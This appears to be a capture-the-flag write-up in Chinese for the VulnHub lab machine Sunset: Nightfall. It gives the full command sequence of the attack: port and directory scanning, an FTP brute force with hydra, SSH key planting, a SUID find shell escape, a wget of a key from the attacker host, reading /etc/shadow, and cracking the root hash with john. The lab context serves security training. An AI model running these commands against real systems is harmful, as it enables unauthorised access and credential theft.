# Sunset:nightfall

## 环境

虚拟机平台：Oracle VM VirtualBox

攻击机：Kali（IP：192.168.56.102）

靶机：nightfall（IP：192.168.56.104）

下载：https://www.vulnhub.com/entry/sunset-nightfall,355/

## Let's go

```
nmap -A 192.168.56.104
```

![](./img/Sunset：Nightfall-01.png)![](./img/Sunset：Nightfall-02.png)

```
dirb http://192.168.56.104/
```

![](./img/Sunset：Nightfall-03.png)

> **并没有发现什么，我们对SMB进行枚举**

```
enum4linux -a 192.168.56.104
```

![](./img/Sunset：Nightfall-04.png)

> **得到两个用户 ‘nightfall’ 和 ‘matt’ ，接下来我们进行暴力破解**

```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -e nsr 192.168.56.104 ftp -f
```

![](./img/Sunset：Nightfall-05.png)

```
#尝试SSH登录失败,老老实实登录FTP
ftp 192.168.56.104
username:matt
password:cheese
```

![](./img/Sunset：Nightfall-06.png)

```
#我们通过FTP将SSH密钥上传
ssh-keygen
cp .ssh/id_rsa.pub authorized_keys
chmod 777 authorized_keys
```

![](./img/Sunset：Nightfall-07.png)

```
mkdir .ssh
cd .ssh
put authorized_keys
```

![](./img/Sunset：Nightfall-08.png)

```
ssh matt@192.168.56.104
```

![](./img/Sunset：Nightfall-09.png)

```
find / -perm -u=s -type f 2>/dev/null
```

![](./img/Sunset：Nightfall-10.png)

```
cd /scripts
./find . -exec /bin/sh -p \;
```

![](./img/Sunset：Nightfall-11.png)

> **这是一个受限的shell，因此我们要想办法**

```
cd /home/nightfall
mkdir .ssh
cd .ssh
wget http://192.168.56.102/authorized_keys
```

![](./img/Sunset：Nightfall-12.png)

```
ssh nightfall@192.168.56.104
```

![](./img/Sunset：Nightfall-13.png)

```
sudo -l
```

![](./img/Sunset：Nightfall-14.png)

```
sudo cat /etc/shadow
```

![](./img/Sunset：Nightfall-15.png)

```
vim root		#将哈希写入root
john root
```

![](./img/Sunset：Nightfall-16.png)

```
su root
password:miguel2
cd
cat root_super_secret_flag.txt
```

![](./img/Sunset：Nightfall-17.png)